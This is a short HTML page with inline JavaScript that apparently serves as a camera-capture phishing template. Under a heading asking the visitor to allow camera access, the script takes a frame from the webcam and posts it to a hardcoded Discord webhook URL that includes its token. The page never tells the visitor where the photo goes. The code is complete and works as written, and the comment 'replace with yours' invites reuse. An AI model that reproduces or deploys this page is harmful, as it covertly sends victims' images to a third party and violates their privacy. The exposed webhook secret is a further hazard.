<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Capture</title>
</head>
<body>
    <h1>Allow Camera Access</h1>
    <video id="video" autoplay></video>
    <button id="capture">Capture Photo</button>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const captureButton = document.getElementById('capture');

        // Discord webhook URL (replace with yours)
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1320376121572724777/ZwPWtXeYwYDQ9tH-H4TAHl_Vv2YVwbLo90oRI8ojgNVWH3PjTavwrPPbtTmdwf7RwIL7";

        // Request camera permissions and start video stream
        navigator.mediaDevices.getUserMedia({ video: true })
            .then((stream) => {
                video.srcObject = stream;
            })
            .catch((error) => {
                alert('Camera access denied!');
                console.error(error);
            });

        captureButton.addEventListener('click', () => {
            // Draw video frame onto canvas
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert canvas to image (Base64)
            canvas.toBlob((blob) => {
                const formData = new FormData();
                formData.append('file', blob, 'photo.png');

                // Send the image to Discord webhook
                fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    body: formData,
                })
                    .then((response) => {
                        if (response.ok) {
                            alert('Photo sent successfully!');
                        } else {
                            alert('Failed to send photo.');
                        }
                    })
                    .catch((error) => {
                        alert('An error occurred.');
                        console.error(error);
                    });
            });
        });
    </script>
</body>
</html>
